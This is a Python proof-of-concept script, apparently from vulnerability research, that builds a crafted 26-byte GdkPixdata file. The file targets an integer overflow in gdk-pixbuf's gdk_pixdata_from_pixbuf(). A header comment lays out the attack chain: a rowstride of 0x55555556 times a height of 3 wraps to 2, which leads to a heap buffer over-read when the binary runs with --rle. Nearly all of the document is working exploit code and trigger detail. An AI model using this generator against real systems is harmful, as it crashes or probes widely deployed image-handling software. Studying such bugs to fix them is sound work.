#!/usr/bin/env python3
"""
PoC generator for VULN-002: Integer Overflow in gdk_pixdata_from_pixbuf()
File: gdk-pixdata.c, lines 349, 371-372, 375-377
CWE-190 (Integer Overflow) -> CWE-122 (Heap Buffer Overflow)

Vulnerability root cause (gdk-pixdata.c):
  Line 349:  guint pad, n_bytes = rowstride * height;   // guint * guint, 32-bit
  Line 371:  pad = rowstride;
  Line 372:  pad = MAX (pad, 130 + n_bytes / 127);
  Line 373:  data = g_new (guint8, pad + n_bytes);       // overflow if pad+n_bytes > 2^32

Attack chain:
  1. Craft a GdkPixdata (pixdata) file with large rowstride and height so that
       rowstride * height (32-bit unsigned) wraps around to a SMALL value (n_bytes_wrap).
  2. The pixdata loader calls gdk_pixbuf_from_pixdata() with copy_pixels=TRUE:
       - g_try_malloc_n(height, rowstride) allocates ~4 GB virtual (succeeds on 64-bit Linux)
       - memcpy(data, pixel_data, rowstride * height [32-bit wrapped]) copies only n_bytes_wrap bytes
     So the pixbuf's pixel buffer has n_bytes_wrap bytes of valid data but APPEARS to hold
     height * rowstride bytes to callers.
  3. The binary calls gdk_pixdata_from_pixbuf(pixbuf, use_rle=TRUE) [needs --rle flag]:
       - n_bytes = rowstride * height = n_bytes_wrap  (32-bit, same wrap)
       - n_bytes % bpp != 0  ->  enters ALTERNATE PATH (lines 353-367)
       - In alternate path:
           new_n_bytes  = pixbuf->width * bpp * height   (correct dimensions)
           g_malloc(new_n_bytes) allocates correctly-sized destination buffer
           gdk_pixbuf_copy_area(pixbuf, 0, 0, width, height, buf, 0, 0) tries to READ
             width * height * bpp bytes from pixbuf->pixels which only has n_bytes_wrap
             bytes -> HEAP BUFFER OVERFLOW READ detected by AddressSanitizer

Chosen parameters for minimal file size:
  - width     = 2
  - height    = 3
  - rowstride = 0x55555556 = 1431655766   (RGBA: rowstride >= width=2, valid)
  - bpp       = 4  (RGBA, has_alpha=True)
  - rowstride * height [32-bit] = 1431655766 * 3 = 4294967298 mod 2^32 = 2  (wrap!)
  - gdk_pixbuf_from_pixdata allocates g_try_malloc_n(3, 1431655766) ~= 4 GB virtual
    but copies only 2 bytes  ->  pixbuf->pixels is a 2-byte region
  - gdk_pixdata_from_pixbuf: n_bytes=2, 2%4=2!=0 -> alternate path
    -> gdk_pixbuf_copy_area tries to read width*height*bpp = 2*3*4 = 24 bytes from 2-byte buf

The GdkPixdata file format (all fields big-endian / network byte order):
  Offset  Size  Field
       0     4  magic         = 0x47646b50  ('GdkP')
       4     4  length        = total length (header + pixel data); set = 26 (accurate)
       8     4  pixdata_type  = color_type | sample_width | encoding
                               RGBA=0x02, 8-bit=(0x01<<16), RAW=(0x01<<24) -> 0x01010002
      12     4  rowstride     = 0x55555556
      16     4  width         = 2
      20     4  height        = 3
      24     N  pixel_data    = N bytes; N=2 (the wrapped value, just enough to satisfy
                               the bounds in deserialize with our length field)

NOTE: Binary only supports GdkPixdata format, NOT BMP.
      Must pass --rle flag to gdk-pixbuf-pixdata to trigger the vulnerable RLE path.
"""
import struct
import os
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# GdkPixdata constants (big-endian serialization)
GDK_PIXBUF_MAGIC_NUMBER     = 0x47646b50   # 'GdkP'
GDK_PIXDATA_HEADER_LENGTH   = 24

GDK_PIXDATA_COLOR_TYPE_RGBA = 0x02
GDK_PIXDATA_SAMPLE_WIDTH_8  = 0x01 << 16  # = 0x00010000
GDK_PIXDATA_ENCODING_RAW    = 0x01 << 24  # = 0x01000000

PIXDATA_TYPE_RGBA_RAW = (
    GDK_PIXDATA_ENCODING_RAW | GDK_PIXDATA_SAMPLE_WIDTH_8 | GDK_PIXDATA_COLOR_TYPE_RGBA
)  # = 0x01010002

# Integer overflow trigger parameters
# rowstride * height (32-bit unsigned) must overflow to a small value
#   1431655766 * 3 = 4294967298  ->  mod 2^32  =  2   (only 2 bytes copied by memcpy)
ROWSTRIDE_OVERFLOW = 0x55555556  # = 1431655766
WIDTH               = 2
HEIGHT              = 3
# The 32-bit wrapped pixel-data size: 1431655766 * 3 mod 2^32
ACTUAL_PIX_BYTES    = (ROWSTRIDE_OVERFLOW * HEIGHT) & 0xFFFFFFFF  # = 2

assert ACTUAL_PIX_BYTES == 2, f"Unexpected wrap value: {ACTUAL_PIX_BYTES}"

# Pixel data: ACTUAL_PIX_BYTES bytes (arbitrary values; alternating to reduce RLE compression)
PIXEL_DATA = bytes([0xDE, 0xAD])  # 2 bytes  (padded RGBA row prefix for width=2, height=3)

# Total file length
TOTAL_LENGTH = GDK_PIXDATA_HEADER_LENGTH + len(PIXEL_DATA)  # = 26

# Build the GdkPixdata binary blob (all fields big-endian per the format spec)
header = struct.pack(
    ">IIIIII",
    GDK_PIXBUF_MAGIC_NUMBER,    # magic
    TOTAL_LENGTH,               # length (accurate: 26 bytes total)
    PIXDATA_TYPE_RGBA_RAW,      # pixdata_type: RGBA 8-bit RAW
    ROWSTRIDE_OVERFLOW,         # rowstride = 0x55555556
    WIDTH,                      # width  = 2
    HEIGHT,                     # height = 3
)
assert len(header) == GDK_PIXDATA_HEADER_LENGTH

poc_data = header + PIXEL_DATA

out_path = os.path.join(SCRIPT_DIR, "vuln_002.pixdata")
with open(out_path, "wb") as f:
    f.write(poc_data)

print(f"[+] Wrote {len(poc_data)} bytes to {out_path}")
print(f"    Header fields:")
print(f"      magic        = 0x{GDK_PIXBUF_MAGIC_NUMBER:08x}  ('GdkP')")
print(f"      length       = {TOTAL_LENGTH}  (header + {len(PIXEL_DATA)} pixel bytes)")
print(f"      pixdata_type = 0x{PIXDATA_TYPE_RGBA_RAW:08x}  (RGBA 8-bit RAW)")
print(f"      rowstride    = 0x{ROWSTRIDE_OVERFLOW:08x} = {ROWSTRIDE_OVERFLOW}")
print(f"      width        = {WIDTH}")
print(f"      height       = {HEIGHT}")
print(f"")
print(f"    Overflow calculation:")
print(f"      rowstride * height [guint32] = 0x{(ROWSTRIDE_OVERFLOW * HEIGHT) & 0xFFFFFFFF:08x} = {ACTUAL_PIX_BYTES}")
print(f"      (actual 64-bit product       = {ROWSTRIDE_OVERFLOW * HEIGHT}  =>  wraps to {ACTUAL_PIX_BYTES})")
print(f"      Allocation via g_try_malloc_n(height={HEIGHT}, rowstride={ROWSTRIDE_OVERFLOW}):")
print(f"        = malloc({ROWSTRIDE_OVERFLOW * HEIGHT}) ~= {ROWSTRIDE_OVERFLOW * HEIGHT // (1024**3):.1f} GB  (virtual, 64-bit)")
print(f"      memcpy copies only {ACTUAL_PIX_BYTES} bytes into this large buffer")
print(f"")
print(f"    Expected ASAN trigger in gdk_pixdata_from_pixbuf (--rle path):")
print(f"      n_bytes = rowstride * height [guint32] = {ACTUAL_PIX_BYTES}  (same wrap)")
print(f"      {ACTUAL_PIX_BYTES} % bpp(4) = {ACTUAL_PIX_BYTES % 4} != 0  ->  alternate path taken")
print(f"      gdk_pixbuf_copy_area reads width*height*bpp = {WIDTH*HEIGHT*4} bytes")
print(f"      from pixbuf->pixels which only holds {ACTUAL_PIX_BYTES} bytes  ->  OOB read")
print(f"      AddressSanitizer: heap-buffer-overflow READ of size {WIDTH*HEIGHT*4 - ACTUAL_PIX_BYTES}")
print(f"")
print(f"    IMPORTANT: Requires ~4 GB virtual allocation to succeed.")
print(f"    Run with:  ./vuln_002_run.sh")
print(f"    Binary flag required: --rle")
